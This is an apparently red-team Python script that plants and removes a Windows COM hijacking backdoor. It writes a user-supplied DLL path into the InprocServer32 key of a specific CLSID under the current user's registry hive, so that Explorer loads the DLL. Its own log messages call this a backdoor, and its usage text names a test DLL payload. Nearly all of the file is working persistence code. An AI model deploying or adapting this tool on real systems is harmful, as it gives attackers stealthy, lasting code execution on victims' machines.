#!/usr/bin/python3
# -*- coding: utf-8 -*-
# @Time    : 2020.02.05
# @Author  : Lhaihai
# @File    : com_explorer_Hijack
# @Software: PyCharm
# @Blog    : http://www.Lhaihai.top
"""
    Description : 
"""

import pyregedit.pyregedit as pyregedit
from logger import factory_logger
logger = factory_logger('com_explorer_Hijack')
import os,sys

def init():
    root = pyregedit.HKEY_CURRENT_USER
    path = r"Software\Classes\CLSID\{42aedc87-2188-41fd-b9a3-0c966feabec1}"
    reg = pyregedit.RegEdit(root,path)
    if reg.check_key():
        path = r"Software\Classes\CLSID\{42aedc87-2188-41fd-b9a3-0c966feabec1}\InprocServer32"
        reg = pyregedit.RegEdit(root, path)
        if reg.check_key():
            pass
        else:
            reg.create_key()
            logger.info('创建了InprocServer32')
    else:
        reg.create_key()
        path = r"Software\Classes\CLSID\{42aedc87-2188-41fd-b9a3-0c966feabec1}\InprocServer32"
        reg = pyregedit.RegEdit(root,path)
        reg.create_key()
        logger.info('创建了InprocServer32')
    return reg

def set_com_explorer_Hijack(cmd):

    reg = init()
    try:
        reg.create_value('',pyregedit.REG_SZ,cmd)
        reg.create_value('ThreadingModel',pyregedit.REG_SZ,'Apartment')
        logger.info('插入注册表成功')
    except:
        logger.error('插入注册表失败')

def clear_com_explorer_Hijack():

    root = pyregedit.HKEY_CURRENT_USER
    path = r"Software\Classes\CLSID\{42aedc87-2188-41fd-b9a3-0c966feabec1}"
    reg = pyregedit.RegEdit(root, path)

    if reg.check_key():
        try:
            reg.delete_sub_key('InprocServer32')
            reg.delete_current_key()
            logger.info('清除成功')
        except:
            logger.error('清除失败')
    else:
        logger.info('该后门没有植入')
        return

if __name__ == '__main__':
    action = sys.argv[1] if len(sys.argv) > 1 else ''
    if action == 'set':
        cmd = sys.argv[2]
        # cmd = r'c:\calcmutex_x64.dll'
        if ':' not in cmd and '\\' not in cmd:
            path = os.getcwd() + '\\' + cmd
            if os.path.exists(path):
                set_com_explorer_Hijack(path)
            else:
                logger.error(cmd + '文件不存在')
        else:
            set_com_explorer_Hijack(cmd)
    elif action == 'clear':
        clear_com_explorer_Hijack()
    else:
        print('com_explorer_Hijack_64.exe set calcmutex_x64.dll')
        print('com_explorer_Hijack_64.exe clear')